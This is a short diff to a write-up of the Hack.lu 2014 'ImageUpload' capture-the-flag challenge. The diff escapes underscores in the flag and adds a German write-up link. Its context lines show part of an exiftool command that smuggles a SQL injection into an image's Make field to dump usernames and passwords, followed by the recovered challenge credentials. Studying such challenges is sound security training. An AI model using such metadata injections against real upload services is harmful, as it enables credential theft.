@@ -49,10 +49,11 @@ $ exiftool -Make="foo', (SELECT GROUP_CONCAT(CONCAT(name, ':', password)) FROM u
 
 The result: `sheriff:AO7eikkOCucCFJOyyaaQ,deputy:testpw`.
 
-Logging in using `sheriff` as the username and `AO7eikkOCucCFJOyyaaQ` as the password reveals the flag `flag{1_5h07_7h3_5h3r1ff}`.
+Logging in using `sheriff` as the username and `AO7eikkOCucCFJOyyaaQ` as the password reveals the flag `flag{1\_5h07\_7h3\_5h3r1ff}`.
 
 ## Other write-ups and resources
 
 * <http://akaminsky.net/hack-lu-ctf-2014-web-200-imageupload/>
 * <http://www.mrt-prodz.com/blog/view/2014/10/hacklu-ctf-2014---imageupload-200pts-writeup/>
 * [Writeup by captchaflag](http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload/)
+* [German](https://f00l.de/blog/hack-lu-ctf-2014-imageupload/)
